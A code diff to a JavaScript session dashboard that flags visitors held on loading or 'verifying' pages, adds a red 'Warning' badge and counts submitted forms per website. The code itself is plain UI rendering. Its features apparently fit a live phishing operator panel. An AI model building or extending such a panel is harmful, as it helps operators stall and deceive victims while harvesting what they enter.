@@ -174,13 +174,29 @@ const SessionTemplates = (() => {
   }
 
   // ─── Loading page detection ──────────────────────────────────────────────────
-  // Returns true for any URL that represents a loading / hold screen,
-  // regardless of the exact filename used (loader, wait, standby, etc.).
-  function isLoadingPage(url) {
+  // Returns true for any URL or pageType that represents a loading / hold screen.
+  function isLoadingPage(url, pageType) {
+    if (pageType === 'loading') return true;
     const p = (url || '').toLowerCase().split('?')[0].replace(/\/$/, '');
+    if (!p) return false;
+
     // Match any path segment that is a loading-type keyword
     const seg = p.split('/').pop();
-    return /^(loading|loader|wait|waiting|hold|holdscreen|please[-_]?wait|standby|processing|verifying)(.html)?$/.test(seg);
+    if (/^(loading|loader|wait|waiting|hold|holdscreen|please[-_]?wait|standby|processing|verifying)(.html)?$/.test(seg)) {
+      return true;
+    }
+
+    // Check in registered demo pages state if available
+    const pagesState = window.DemoPagesState?.pages || window.state?.pages;
+    if (Array.isArray(pagesState)) {
+      const match = pagesState.find(dp => {
+        const dpUrl = (dp.url || '').toLowerCase().split('?')[0].replace(/\/$/, '');
+        return dpUrl && (dpUrl === p || p.endsWith(dpUrl) || dpUrl.endsWith(p));
+      });
+      if (match && match.form_type === 'loading') return true;
+    }
+
+    return false;
   }
 
   function renderSessionCard(s, selectedSessionIds, isSelectMode) {
@@ -203,10 +219,11 @@ const SessionTemplates = (() => {
 
     // Check if user is currently on the loading page (hold state)
     const pagePath = (s.current_page || '').toLowerCase();
-    const isHolding = s.is_active && isLoadingPage(pagePath);
+    const isHolding = s.is_active && isLoadingPage(pagePath, s.current_page_type);
+    const isWarning = s.is_active && s.current_page_type === 'warning';
 
     return `
-      <div class="session-card ${s.is_active ? 'is-online' : 'is-offline'} ${isHolding ? 'is-holding' : ''} ${isSelected ? 'selected' : ''} ${isSelectMode ? 'select-mode-active' : ''}" data-session-id="${s.id}" style="--site-color:${siteRgb};">
+      <div class="session-card ${s.is_active ? 'is-online' : 'is-offline'} ${isHolding ? 'is-holding' : ''} ${isWarning ? 'is-warning' : ''} ${isSelected ? 'selected' : ''} ${isSelectMode ? 'select-mode-active' : ''}" data-session-id="${s.id}" style="--site-color:${siteRgb};">
         <div class="session-card-select-wrap">
           <div class="card-checkbox"></div>
         </div>
@@ -221,6 +238,10 @@ const SessionTemplates = (() => {
                   ? `<span class="status-badge holding">
                        <span class="pulse-dot-amber"></span>Holding
                      </span>`
+                  : isWarning
+                  ? `<span class="status-badge warning" style="background:rgba(239,68,68,0.15);color:#ef4444;border:1px solid rgba(239,68,68,0.3);">
+                       <span class="pulse-dot-amber" style="background:#ef4444;"></span>Warning
+                     </span>`
                   : `<span class="status-badge ${s.is_active ? 'online' : 'offline'}">
                        ${s.is_active ? '<span class="pulse-dot"></span>Live' : 'Offline'}
                      </span>`
@@ -230,6 +251,7 @@ const SessionTemplates = (() => {
                   ${escapeHtml(s.website_name || 'Website')}
                 </span>
                 ${isHolding ? `<span class="badge-waiting">⚠️ Action Required</span>` : ''}
+                ${isWarning ? `<span class="badge-waiting" style="background:rgba(239,68,68,0.12);color:#ef4444;border-color:rgba(239,68,68,0.25);">🚨 On Warning Page</span>` : ''}
                 ${formCount > 0 ? `<span class="badge-formdata">📝 ${formCount} form${formCount > 1 ? 's' : ''}</span>` : ''}
               </div>
             </div>
